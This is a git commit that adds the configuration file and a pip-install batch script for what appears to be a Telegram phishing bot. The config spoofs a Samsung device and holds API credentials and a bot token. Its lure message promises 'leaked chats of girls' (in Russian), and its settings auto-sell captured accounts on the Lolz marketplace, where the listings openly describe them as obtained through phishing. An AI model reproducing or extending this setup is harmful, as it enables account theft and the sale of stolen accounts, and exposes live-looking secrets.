302727ac2f22c802ef31dd2bfc258fb665b7a88e
Tonishir <160059625+Tonishir@users.noreply.github.com>
2024-02-14 23:22:24 +0300

    Add files via upload

---
+++ config.py
@@ -0,0 +1,24 @@
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
+
+api_id = 28335162
+api_hash = "e7546b853ca2bb3c2d34410c11fe74ad"
+API_TOKEN = "5666699976:AAHsVhZo-i-8bStLr_bEC5d0ZHcw4sJuqek"
+admin = 5657763080
+updates = -1001600406377
+device_model = "999 SM-G998B"
+system_version = "SDK 31"
+app_version = "8.4.1 (2522)"
+lang_code = "en"
+system_lang_code = "en-US"
+
+SEND_MSG = '@{username} — слитые переписки девушек 🔞'
+
+# Lolz Setting
+AUTO_SELL_LOLZ = False
+LOLZ_KEY = ''
+LOLZ_ACCOUNT_PRICE = 11
+LOLZ_ACCOUNT_PREMIUM_PRICE = 80
+LOLZ_ACCOUNT_TITLE = 'Телеграм | Прямо с печки | Лучшее качество'
+LOLZ_ACCOUNT_ORIGIN = 'fishing'
+LOLZ_ACCOUNT_DESCRIPTION = 'Этот аккаунт добыт через фишинг t.me/business_dark'
---
+++ install-modules.bat
@@ -0,0 +1,4 @@
+python -m pip install --upgrade pip
+python -m pip install -r requirements.txt
+pip install --upgrade h2
+pause
